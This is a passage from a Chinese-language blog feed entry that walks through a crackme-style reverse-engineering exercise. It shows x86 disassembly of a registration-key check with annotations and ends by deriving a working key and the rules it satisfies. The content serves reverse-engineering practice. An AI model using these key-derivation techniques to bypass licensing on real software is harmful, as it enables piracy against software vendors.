class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">01151CB0    55              push    ebp</div><div class="line">01151CB1    8BEC            mov     ebp, esp</div><div class="line">01151CB3    81EC D0000000   sub     esp, 0xD0</div><div class="line">01151CB9    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">01151CBE    33C5            xor     eax, ebp</div><div class="line">01151CC0    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151CC3    57              push    edi</div><div class="line">01151CC4    8BF9            mov     edi, ecx</div><div class="line">01151CC6    85FF            test    edi, edi</div><div class="line">01151CC8    0F84 61010000   je      01151E2F</div><div class="line">01151CCE    85D2            test    edx, edx</div><div class="line">01151CD0    0F85 81000000   jnz     01151D57</div><div class="line">01151CD6    E8 25FFFFFF     call    01151C00       ;判断注册码是否包含&apos;b&apos;</div><div class="line">01151CDB    85C0            test    eax, eax</div><div class="line">01151CDD    74 54           je      short 01151D33</div><div class="line">01151CDF    68 C8000000     push    0xC8</div><div class="line">01151CE4    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CEA    6A 00           push    0x0</div><div class="line">01151CEC    50              push    eax</div><div class="line">01151CED    E8 DE1C0000     call    &lt;memset&gt;</div><div class="line">01151CF2    83C4 0C         add     esp, 0xC</div><div class="line">01151CF5    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CFB    6A 64           push    0x64</div><div class="line">01151CFD    50              push    eax</div><div class="line">01151CFE    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D01    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D07    6A 70           push    0x70</div><div class="line">01151D09    8D95 34FFFFFF   lea     edx, dword ptr [ebp-0xCC]</div><div class="line">01151D0F    E8 3C0D0000     call    01152A50    ; 判断注册码里是否包含&apos;p&apos;</div><div class="line">01151D14    85C0            test    eax, eax</div><div class="line">01151D16    74 1B           je      short 01151D33</div><div class="line">01151D18    BA 01000000     mov     edx, 0x1</div><div class="line">01151D1D    8BCF            mov     ecx, edi</div><div class="line">01151D1F    E8 8CFFFFFF     call    01151CB0</div><div class="line">01151D24    5F              pop     edi</div><div class="line">01151D25    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D28    33CD            xor     ecx, ebp</div><div class="line">01151D2A    E8 960F0000     call    01152CC5</div><div class="line">01151D2F    8BE5            mov     esp, ebp</div><div class="line">01151D31    5D              pop     ebp</div><div class="line">01151D32    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D57    56              push    esi</div><div class="line">01151D58    E8 812B0000     call    011548DE</div><div class="line">01151D5D    68 C8000000     push    0xC8</div><div class="line">01151D62    8985 30FFFFFF   mov     dword ptr [ebp-0xD0], eax</div><div class="line">01151D68    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D6E    6A 00           push    0x0</div><div class="line">01151D70    50              push    eax</div><div class="line">01151D71    E8 5A1C0000     call    &lt;memset&gt;</div><div class="line">01151D76    83C4 0C         add     esp, 0xC</div><div class="line">01151D79    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D7F    68 C8000000     push    0xC8</div><div class="line">01151D84    50              push    eax</div><div class="line">01151D85    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D88    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D8E    33F6            xor     esi, esi</div><div class="line">01151D90    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D96    66:39B5 34FFFFF&gt;cmp     word ptr [ebp-0xCC], si</div><div class="line">01151D9D    74 0B           je      short 01151DAA</div><div class="line">01151D9F    90              nop</div><div class="line">01151DA0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151DA3    46              inc     esi</div><div class="line">01151DA4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151DA8  ^ 75 F6           jnz     short 01151DA0</div><div class="line">01151DAA    33C9            xor     ecx, ecx</div><div class="line">01151DAC    8D46 01         lea     eax, dword ptr [esi+0x1]</div><div class="line">01151DAF    BA 02000000     mov     edx, 0x2</div><div class="line">01151DB4    F7E2            mul     edx</div><div class="line">01151DB6    53              push    ebx</div><div class="line">01151DB7    0F90C1          seto    cl</div><div class="line">01151DBA    F7D9            neg     ecx</div><div class="line">01151DBC    0BC8            or      ecx, eax</div><div class="line">01151DBE    51              push    ecx</div><div class="line">01151DBF    E8 120F0000     call    01152CD6</div><div class="line">01151DC4    83C4 04         add     esp, 0x4</div><div class="line">01151DC7    8BD8            mov     ebx, eax</div><div class="line">01151DC9    E8 102B0000     call    011548DE</div><div class="line">01151DCE    2B85 30FFFFFF   sub     eax, dword ptr [ebp-0xD0]</div><div class="line">01151DD4    83F8 02         cmp     eax, 0x2</div><div class="line">01151DD7    7F 65           jg      short 01151E3E</div><div class="line">01151DD9    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151DDF    50              push    eax</div><div class="line">01151DE0    53              push    ebx</div><div class="line">01151DE1    E8 8A0A0000     call    01152870</div><div class="line">01151DE6    83FE 07         cmp     esi, 0x7           ;注册码是否为7位</div><div class="line">01151DE9    73 0B           jnb     short 01151DF6</div><div class="line">01151DEB    6A 00           push    0x0</div><div class="line">01151DED    6A 00           push    0x0</div><div class="line">01151DEF    68 0E040000     push    0x40E</div><div class="line">01151DF4    EB 0B           jmp     short 01151E01</div><div class="line">01151DF6    76 2C           jbe     short 01151E24</div><div class="line">01151DF8    6A 00           push    0x0</div><div class="line">01151DFA    6A 00           push    0x0</div><div class="line">01151DFC    68 0D040000     push    0x40D</div><div class="line">01151E01    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151E04    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151E0A    53              push    ebx</div><div class="line">01151E0B    E8 CF0E0000     call    01152CDF</div><div class="line">01151E10    83C4 04         add     esp, 0x4</div><div class="line">01151E13    5B              pop     ebx</div><div class="line">01151E14    5E              pop     esi</div><div class="line">01151E15    5F              pop     edi</div><div class="line">01151E16    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E19    33CD            xor     ecx, ebp</div><div class="line">01151E1B    E8 A50E0000     call    01152CC5</div><div class="line">01151E20    8BE5            mov     esp, ebp</div><div class="line">01151E22    5D              pop     ebp</div><div class="line">01151E23    C3              retn</div><div class="line">01151E24    8BD3            mov     edx, ebx</div><div class="line">01151E26    8BCF            mov     ecx, edi</div><div class="line">01151E28    E8 33FCFFFF     call    01151A60        ;这里进入最后的判断</div><div class="line">01151E2D    5B              pop     ebx</div><div class="line">01151E2E    5E              pop     esi</div><div class="line">01151E2F    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E32    33CD            xor     ecx, ebp</div><div class="line">01151E34    5F              pop     edi</div><div class="line">01151E35    E8 8B0E0000     call    01152CC5</div><div class="line">01151E3A    8BE5            mov     esp, ebp</div><div class="line">01151E3C    5D              pop     ebp</div><div class="line">01151E3D    C3              retn</div><div class="line">01151E3E    6A 00           push    0x0</div><div class="line">01151E40    E8 6C2D0000     call    01154BB1</div></pre></td></tr></table></figure></p><p>以上代码得出注册码必须为7位并且包含字符’b’,’p’<br>再看最后的判断call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">01151870    55              push    ebp</div><div class="line">01151871    8BEC            mov     ebp, esp</div><div class="line">01151873    83EC 54         sub     esp, 0x54</div><div class="line">01151876    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">0115187B    33C5            xor     eax, ebp</div><div class="line">0115187D    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151880    53              push    ebx</div><div class="line">01151881    56              push    esi</div><div class="line">01151882    57              push    edi</div><div class="line">01151883    6A 36           push    0x36</div><div class="line">01151885    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">01151888    8BD9            mov     ebx, ecx</div><div class="line">0115188A    6A 00           push    0x0</div><div class="line">0115188C    50              push    eax</div><div class="line">0115188D    8BFA            mov     edi, edx</div><div class="line">0115188F    895D AC         mov     dword ptr [ebp-0x54], ebx</div><div class="line">01151892    E8 39210000     call    &lt;memset&gt;</div><div class="line">01151897    83C4 0C         add     esp, 0xC</div><div class="line">0115189A    8D4D E8         lea     ecx, dword ptr [ebp-0x18]</div><div class="line">0115189D    B8 30000000     mov     eax, 0x30</div><div class="line">011518A2    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518A5    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518A8    40              inc     eax</div><div class="line">011518A9    83F8 39         cmp     eax, 0x39</div><div class="line">011518AC  ^ 7E F4           jle     short 011518A2                   ; 0-9</div><div class="line">011518AE    B8 61000000     mov     eax, 0x61</div><div class="line">011518B3    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011518B6    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518B9    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518BC    40              inc     eax</div><div class="line">011518BD    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518C0  ^ 7E F4           jle     short 011518B6                   ; a-z</div><div class="line">011518C2    33D2            xor     edx, edx</div><div class="line">011518C4    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">011518C7    66:3955 B0      cmp     word ptr [ebp-0x50], dx</div><div class="line">011518CB    74 0D           je      short 011518DA</div><div class="line">011518CD    0F1F            ???                                      ; 未知命令</div><div class="line">011518CF    008D 40024266   add     byte ptr [ebp+0x66420240], cl</div><div class="line">011518D5    8338 00         cmp     dword ptr [eax], 0x0</div><div class="line">011518D8  ^ 75 F6           jnz     short 011518D0</div><div class="line">011518DA    33C9            xor     ecx, ecx</div><div class="line">011518DC    85D2            test    edx, edx</div><div class="line">011518DE    74 1C           je      short 011518FC</div><div class="line">011518E0    0FB7444D B0     movzx   eax, word ptr [ebp+ecx*2-0x50]</div><div class="line">011518E5    83F8 61         cmp     eax, 0x61</div><div class="line">011518E8    72 0D           jb      short 011518F7</div><div class="line">011518EA    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518ED    77 08           ja      short 011518F7</div><div class="line">011518EF    83C0 E0         add     eax, -0x20</div><div class="line">011518F2    66:89444D B0    mov     word ptr [ebp+ecx*2-0x50], ax</div><div class="line">011518F7    41              inc     ecx</div><div class="line">011518F8    3BCA            cmp     ecx, edx</div><div class="line">011518FA  ^ 72 E4           jb      short 011518E0</div><div class="line">011518FC    33C9            xor     ecx, ecx</div><div class="line">011518FE    8BC7            mov     eax, edi</div><div class="line">01151900    85FF            test    edi, edi</div><div class="line">01151902    74 76           je      short 0115197A</div><div class="line">01151904    66:390F         cmp     word ptr [edi], cx</div><div class="line">01151907    74 11           je      short 0115191A</div><div class="line">01151909    0F1F            ???                                      ; 未知命令</div><div class="line">0115190B    8000 00         add     byte ptr [eax], 0x0</div><div class="line">0115190E    0000            add     byte ptr [eax], al</div><div class="line">01151910    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151913    41              inc     ecx</div><div class="line">01151914    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151918  ^ 75 F6           jnz     short 01151910</div><div class="line">0115191A    33C0            xor     eax, eax</div><div class="line">0115191C    85C9            test    ecx, ecx</div><div class="line">0115191E    74 22           je      short 01151942</div><div class="line">01151920    83F8 02         cmp     eax, 0x2</div><div class="line">01151923    73 07           jnb     short 0115192C</div><div class="line">01151925    66:833447 0F    xor     word ptr [edi+eax*2], 0xF</div><div class="line">0115192A    EB 11           jmp     short 0115193D</div><div class="line">0115192C    83F8 04         cmp     eax, 0x4</div><div class="line">0115192F    73 07           jnb     short 01151938</div><div class="line">01151931    66:833447 50    xor     word ptr [edi+eax*2], 0x50</div><div class="line">01151936    EB 05           jmp     short 0115193D</div><div class="line">01151938    66:833447 42    xor     word ptr [edi+eax*2], 0x42</div><div class="line">0115193D    40              inc     eax</div><div class="line">0115193E    3BC1            cmp     eax, ecx</div><div class="line">01151940  ^ 72 DE           jb      short 01151920</div><div class="line">01151942    33D2            xor     edx, edx</div><div class="line">01151944    8BC7            mov     eax, edi</div><div class="line">01151946    66:3917         cmp     word ptr [edi], dx</div><div class="line">01151949    74 0F           je      short 0115195A</div><div class="line">0115194B    0F1F            ???                                      ; 未知命令</div><div class="line">0115194D    44              inc     esp</div><div class="line">0115194E    0000            add     byte ptr [eax], al</div><div class="line">01151950    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151953    42              inc     edx</div><div class="line">01151954    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151958  ^ 75 F6           jnz     short 01151950</div><div class="line">0115195A    33C9            xor     ecx, ecx</div><div class="line">0115195C    85D2            test    edx, edx</div><div class="line">0115195E    74 1A           je      short 0115197A</div><div class="line">01151960    0FB7044F        movzx   eax, word ptr [edi+ecx*2]</div><div class="line">01151964    83F8 61         cmp     eax, 0x61</div><div class="line">01151967    72 0C           jb      short 01151975</div><div class="line">01151969    83F8 7A         cmp     eax, 0x7A</div><div class="line">0115196C    77 07           ja      short 01151975</div><div class="line">0115196E    83C0 E0         add     eax, -0x20</div><div class="line">01151971    66:89044F       mov     word ptr [edi+ecx*2], ax</div><div class="line">01151975    41              inc     ecx</div><div class="line">01151976    3BCA            cmp     ecx, edx</div><div class="line">01151978  ^ 72 E6           jb      short 01151960</div><div class="line">0115197A    33F6            xor     esi, esi</div><div class="line">0115197C    0F57C0          xorps   xmm0, xmm0</div><div class="line">0115197F    66:0FD6         ???                                      ; 未知命令</div><div class="line">01151982    45              inc     ebp</div><div class="line">01151983    F0:66:8975 F8   lock mov word ptr [ebp-0x8], si          ; 不允许锁定前缀</div><div class="line">01151988    66:3937         cmp     word ptr [edi], si</div><div class="line">0115198B    74 48           je      short 011519D5</div><div class="line">0115198D    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">01151991    8D5D F0         lea     ebx, dword ptr [ebp-0x10]</div><div class="line">01151994    8BC7            mov     eax, edi</div><div class="line">01151996    66:85C9         test    cx, cx</div><div class="line">01151999    74 2C           je      short 011519C7</div><div class="line">0115199B    0FB710          movzx   edx, word ptr [eax]</div><div class="line">0115199E    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519A1    33C0            xor     eax, eax</div><div class="line">011519A3    66:3B11         cmp     dx, word ptr [ecx]</div><div class="line">011519A6    74 10           je      short 011519B8</div><div class="line">011519A8    40              inc     eax</div><div class="line">011519A9    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519AC    66:833C41 00    cmp     word ptr [ecx+eax*2], 0x0</div><div class="line">011519B1    8D0C41          lea     ecx, dword ptr [ecx+eax*2]</div><div class="line">011519B4  ^ 75 ED           jnz     short 011519A3</div><div class="line">011519B6    EB 0B           jmp     short 011519C3</div><div class="line">011519B8    66:8B4445 B0    mov     ax, word ptr [ebp+eax*2-0x50]</div><div class="line">011519BD    66:8903         mov     word ptr [ebx], ax</div><div class="line">011519C0    83C3 02         add     ebx, 0x2</div><div class="line">011519C3    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">011519C7    46              inc     esi</div><div class="line">011519C8    66:833C77 00    cmp     word ptr [edi+esi*2], 0x0</div><div class="line">011519CD    8D0477          lea     eax, dword ptr [edi+esi*2]</div><div class="line">011519D0  ^ 75 C4           jnz     short 01151996</div><div class="line">011519D2    8B5D AC         mov     ebx, dword ptr [ebp-0x54]</div><div class="line">011519D5    33C9            xor     ecx, ecx</div><div class="line">011519D7    8D45 F0         lea     eax, dword ptr [ebp-0x10]</div><div class="line">011519DA    66:394D F0      cmp     word ptr [ebp-0x10], cx</div><div class="line">011519DE    74 59           je      short 01151A39</div><div class="line">011519E0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">011519E3    41              inc     ecx</div><div class="line">011519E4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">011519E8  ^ 75 F6           jnz     short 011519E0</div><div class="line">011519EA    83F9 02         cmp     ecx, 0x2</div><div class="line">011519ED    75 4A           jnz     short 01151A39</div><div class="line">011519EF    33C0            xor     eax, eax</div><div class="line">011519F1    C745 F0 3100350&gt;mov     dword ptr [ebp-0x10], 0x350031</div><div class="line">011519F8    C745 F4 5000420&gt;mov     dword ptr [ebp-0xC], 0x420050</div><div class="line">011519FF    8D77 04         lea     esi, dword ptr [edi+0x4]</div><div class="line">01151A02    66:8945 F8      mov     word ptr [ebp-0x8], ax</div><div class="line">01151A06    33C9            xor     ecx, ecx</div><div class="line">01151A08    0F1F            ???                                      ; 未知命令</div><div class="line">01151A0A    8400            test    byte ptr [eax], al</div><div class="line">01151A0C    0000            add     byte ptr [eax], al</div><div class="line">01151A0E    0000            add     byte ptr [eax], al</div><div class="line">01151A10    66:8B444D F0    mov     ax, word ptr [ebp+ecx*2-0x10]</div><div class="line">01151A15    66:3B06         cmp     ax, word ptr [esi]</div><div class="line">01151A18    75 1F           jnz     short 01151A39</div><div class="line">01151A1A    41              inc     ecx</div><div class="line">01151A1B    83C6 02         add     esi, 0x2</div><div class="line">01151A1E    83F9 04         cmp     ecx, 0x4</div><div class="line">01151A21  ^ 72 ED           jb      short 01151A10</div><div class="line">01151A23    8BD7            mov     edx, edi</div><div class="line">01151A25    8BCB            mov     ecx, ebx</div><div class="line">01151A27    E8 14FDFFFF     call    01151740         ; 这里是最后判断的call，</div><div class="line">01151A2C    6A 00           push    0x0</div><div class="line">01151A2E    85C0            test    eax, eax</div><div class="line">01151A30    74 09           je      short 01151A3B</div><div class="line">01151A32    68 0B040000     push    0x40B</div><div class="line">01151A37    EB 07           jmp     short 01151A40</div><div class="line">01151A39    6A 00           push    0x0</div><div class="line">01151A3B    68 0A040000     push    0x40A</div><div class="line">01151A40    68 11010000     push    0x111</div><div class="line">01151A45    FF73 04         push    dword ptr [ebx+0x4]</div><div class="line">01151A48    FF15 54811601   call    dword ptr [&lt;&amp;USER32.PostMessageW&gt;; user32.PostMessageW</div></pre></td></tr></table></figure></p><p>以上代码比如初始化0-9,a-z，注册码转换成大写，提取出注册码里所有的字母，纯属多余<br>接下去直接看里面最后的call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01151810   &gt; /66:8B01       mov     ax, word ptr [ecx]</div><div class="line">01151813   . |66:3B040E     cmp     ax, word ptr [esi+ecx]           ;  判断第1,2位是否为&apos;12&apos;</div><div class="line">01151817   . |75 42         jnz     short 0115185B</div><div class="line">01151819   . |83C2 06       add     edx, 0x6</div><div class="line">0115181C   . |83C1 02       add     ecx, 0x2</div><div class="line">0115181F   . |83FA 39       cmp     edx, 0x39</div><div class="line">01151822   .^\7E EC         jle     short 01151810</div><div class="line">01151824   .  0FB74F 12     movzx   ecx, word ptr [edi+0x12]    ； 第i位字符+第1位字符是否为0x63（设计不合理?）</div><div class="line">01151828   .  0FB703        movzx   eax, word ptr [ebx]</div><div class="line">0115182B   .  03C8          add     ecx, eax</div><div class="line">0115182D   .  83F9 63       cmp     ecx, 0x63</div><div class="line">01151830   .  75 29         jnz     short 0115185B</div><div class="line">01151832   .  8B45 B4       mov     eax, dword ptr [ebp-0x4C]</div><div class="line">01151835   .  0FB74F 0C     movzx   ecx, word ptr [edi+0xC]</div><div class="line">01151839   .  0308          add     ecx, dword ptr [eax]</div><div class="line">0115183B   .  8B45 B0       mov     eax, dword ptr [ebp-0x50]</div><div class="line">0115183E   .  0FB700        movzx   eax, word ptr [eax]</div><div class="line">01151841   .  3BC1          cmp     eax, ecx</div><div class="line">01151843   .  75 16         jnz     short 0115185B    ; 这里判断注册码最后一位是否等于用&apos;123456789&apos;替换了注册码的n位之后的字符判断的第0x0c位+n是否相等</div><div class="line">01151845   .  5F            pop     edi</div><div class="line">01151846   .  5E            pop     esi</div><div class="line">01151847   .  B8 01000000   mov     eax, 0x1</div><div class="line">0115184C   .  5B            pop     ebx</div></pre></td></tr></table></figure></p><p>以上分析完成得到一组注册码1215pb8<br>1）包含字符’b’’’p’<br>2)  7位长度<br>3)  第1、2位为’1’’2’<br>4） 第0位字符’1’(0x30)+第n位字符(计数所在位)’2’(0x32) = 0x63<br>5)  第3、4、5、6位为’15pb’<br>6)  最后1位为‘7’+计数</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
